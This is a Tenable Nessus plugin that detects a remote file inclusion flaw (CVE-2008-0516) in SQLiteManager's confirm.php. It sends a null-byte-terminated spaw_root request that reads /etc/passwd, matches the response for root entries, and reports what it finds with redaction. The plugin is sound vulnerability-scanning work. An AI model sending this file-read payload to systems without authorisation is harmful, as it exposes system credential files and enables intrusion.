#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(30131);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-0516");
  script_bugtraq_id(27515);

  script_name(english:"SQLiteManager confirm.php spaw_root Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
remote file include attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running SQLiteManager, a web-based application for
managing SQLite databases. 

The version of SQLiteManager installed on the remote host fails to
sanitize user-supplied input to the 'spaw_root' parameter of the
'spaw/dialogs/confirm.php' script before using it to include PHP code. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated, remote attacker can exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"d2_elliot_name", value:"SQLiteManager 1.2.0 RFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sqlite_manager:sqlite_manager");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/sqlitemanager", "/sqlite", "/db", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/etc/passwd";

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/spaw/dialogs/confirm.php?", 
      "spaw_root=", file, "%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error because magic_quotes was enabled or...
    string(file, "\\0class/lang.class.php") >< res ||
    # we get an error claiming the file doesn't exist or...
    string("main(", file, "): failed to open stream: No such file") >< res ||
    string("include(", file, ") [function.include]: failed to open stream: No such file") >< res ||
    # we get an error about open_basedir restriction.
    string("open_basedir restriction in effect. File(", file) >< res
  )
  {
    if (report_verbosity && egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ("<br" >< contents) contents = contents - strstr(contents, "<br");
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
